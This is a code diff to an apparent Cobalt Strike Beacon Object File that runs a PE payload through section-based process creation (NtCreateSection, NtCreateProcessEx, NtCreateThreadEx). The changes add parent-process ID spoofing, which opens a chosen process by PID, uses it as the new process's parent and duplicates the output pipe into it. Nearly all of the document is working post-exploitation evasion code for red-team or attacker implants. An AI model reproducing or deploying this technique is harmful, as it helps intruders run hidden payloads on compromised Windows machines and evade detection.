@@ -610,7 +610,10 @@ NTSYSAPI NTSTATUS NTAPI NTDLL$RtlCreateProcessParametersEx(
 
 WINBASEAPI WINBOOL WINAPI KERNEL32$CreatePipe(PHANDLE hReadPipe, PHANDLE hWritePipe, LPSECURITY_ATTRIBUTES lpPipeAttributes, DWORD nSize);
 WINBASEAPI WINBOOL WINAPI KERNEL32$SetHandleInformation(HANDLE hObject, DWORD dwMask, DWORD dwFlags);
-WINBASEAPI WINBOOL WINAPI KERNEL32$ReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);BOOL CopyBytesByHandle(PBYTE peBytes,DWORD size,HANDLE targetHandle) {
+WINBASEAPI WINBOOL WINAPI KERNEL32$ReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
+WINBASEAPI WINBOOL WINAPI KERNEL32$DuplicateHandle(HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, WINBOOL bInheritHandle, DWORD dwOptions);
+
+BOOL CopyBytesByHandle(PBYTE peBytes,DWORD size,HANDLE targetHandle) {
     DWORD bytesWritten;
     KERNEL32$WriteFile(targetHandle,
         peBytes,
@@ -849,6 +852,7 @@ void go(char* buff, int len) {
     unsigned char* pebytes;
     wchar_t* args;
     int capture_output = 0;
+    int ppid = 0;
     SIZE_T pebytes_len;
     SECURITY_ATTRIBUTES saAttr;
     // Set the bInheritHandle flag so pipe handles are inherited. 
@@ -858,12 +862,14 @@ void go(char* buff, int len) {
     saAttr.lpSecurityDescriptor = NULL;
     HANDLE g_hChildStd_OUT_Rd = NULL;
     HANDLE g_hChildStd_OUT_Wr = NULL;
+	HANDLE hPipeDup = INVALID_HANDLE_VALUE;
 
     BeaconDataParse(&parser, buff, len);
     peName = BeaconDataExtract(&parser, NULL);
     pebytes_len = BeaconDataLength(&parser);
     pebytes = (unsigned char*)BeaconDataExtract(&parser, NULL);
     capture_output = BeaconDataInt(&parser);
+    ppid = BeaconDataInt(&parser);
     args = (wchar_t*)BeaconDataExtract(&parser,NULL);
     // Declare variables / structs
     HANDLE hProc = NULL;
@@ -877,14 +883,15 @@ void go(char* buff, int len) {
     void* remotePayloadAddr;
     //ULONG_PTR dwData = NULL;
     SIZE_T bytesWritten;
-
-     if (!KERNEL32$CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0)){
-        BeaconPrintf(CALLBACK_OUTPUT, "[-] CreatePipe Failed with error %d\n",GetLastError());
-        return;
-     }
-    if (!KERNEL32$SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0)){
-        BeaconPrintf(CALLBACK_OUTPUT, "[-] SetHandleInformation Failed with error %d\n",GetLastError());
-        return;
+    if(capture_output){
+        if (!KERNEL32$CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0)){
+            BeaconPrintf(CALLBACK_OUTPUT, "[-] CreatePipe Failed with error %d\n",GetLastError());
+            return;
+        }
+        if (!KERNEL32$SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0)){
+            BeaconPrintf(CALLBACK_OUTPUT, "[-] SetHandleInformation Failed with error %d\n",GetLastError());
+            return;
+        }
     }
     BeaconPrintf(CALLBACK_OUTPUT, "pe bytes len: %d\n", pebytes_len);
     BeaconPrintf(CALLBACK_OUTPUT, "pe bytes addr: 0x%p\n", pebytes);
@@ -930,11 +937,28 @@ void go(char* buff, int len) {
         BeaconPrintf(CALLBACK_OUTPUT, "[+] NtCreateSection success. sectionHandle: 0x%p\n",sectionHandle);
     }
 
-    HANDLE processHandle;
+    HANDLE processHandle = INVALID_HANDLE_VALUE, parent = INVALID_HANDLE_VALUE;
+    if(ppid == 0)
+        parent = KERNEL32$GetCurrentProcess();
+    else{
+        parent = KERNEL32$OpenProcess(MAXIMUM_ALLOWED, 0, ppid);
+        if(parent == INVALID_HANDLE_VALUE){
+            BeaconPrintf(CALLBACK_OUTPUT, "[-] OpenProcess failed with error: %d\n",GetLastError());
+            return;
+        }
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] OpenProcess succeded. parent=0x%p\n",parent);
+    }
+    if(capture_output && ppid){
+        if (!KERNEL32$DuplicateHandle(KERNEL32$GetCurrentProcess(), g_hChildStd_OUT_Wr, parent, &hPipeDup, 0, 1, DUPLICATE_SAME_ACCESS)){
+            BeaconPrintf(CALLBACK_OUTPUT, "[-]DuplicateHandle failed with error: %d\n",GetLastError());
+            return;
+        }
+        BeaconPrintf(CALLBACK_OUTPUT, "[+]DuplicateHandle succeded. hPipeDup=0x%p\n",hPipeDup);
+    }
     res = NTDLL$NtCreateProcessEx(&processHandle,
         PROCESS_ALL_ACCESS,
         NULL,
-        KERNEL32$GetCurrentProcess(),
+        parent,
         PROCESS_CREATE_FLAGS_INHERIT_HANDLES,
         sectionHandle,
         NULL,
@@ -999,6 +1023,13 @@ void go(char* buff, int len) {
     ptr += wcslen(exe_path);
     memcpy(ptr,args,wcslen(args)*sizeof(wchar_t));
 
+    HANDLE pipe_write = INVALID_HANDLE_VALUE;
+    if(ppid!=0){
+        pipe_write = hPipeDup;
+    }
+    else{
+        pipe_write = g_hChildStd_OUT_Wr;
+    }
     if(!WriteRemoteProcessParameters(
         processHandle,
         L"C:\\Users\\Windows\\System32\\cmd.exe",
@@ -1010,7 +1041,7 @@ void go(char* buff, int len) {
         L"WinSta0\\Default",
         L"",
         L"",
-        g_hChildStd_OUT_Wr)){
+        pipe_write)){
             KERNEL32$CloseHandle(processHandle);
             KERNEL32$CloseHandle(targetFileHandle);
             free(commandline);
@@ -1020,7 +1051,7 @@ void go(char* buff, int len) {
     void* remoteEntryPoint = (LPBYTE)peb.ImageBaseAddress + imageEntryPointRva;
     BeaconPrintf(CALLBACK_OUTPUT, "Creating thread in process at entry point 0x%p...\n", remoteEntryPoint);
 
-    HANDLE threadHandle;
+    HANDLE threadHandle = INVALID_HANDLE_VALUE;
     status = NTDLL$NtCreateThreadEx(&threadHandle,
         THREAD_ALL_ACCESS,
         NULL,
@@ -1055,7 +1086,17 @@ void go(char* buff, int len) {
     }
     if(capture_output){
         KERNEL32$CloseHandle(g_hChildStd_OUT_Wr);
+        if (hPipeDup != INVALID_HANDLE_VALUE) {
+			if (!KERNEL32$DuplicateHandle(parent, hPipeDup, NULL,
+				&hPipeDup, 0, FALSE, DUPLICATE_CLOSE_SOURCE))
+				BeaconPrintf(CALLBACK_OUTPUT,"[-] Duplicate Handle failed with error: {}", GetLastError());
+            else{
+                BeaconPrintf(CALLBACK_OUTPUT,"[+] Duplicate Handle succeded.");
+            }
+
+		}
         readFromPipe(g_hChildStd_OUT_Rd);
+        KERNEL32$CloseHandle(g_hChildStd_OUT_Rd);
     }
     free(commandline);
     return;
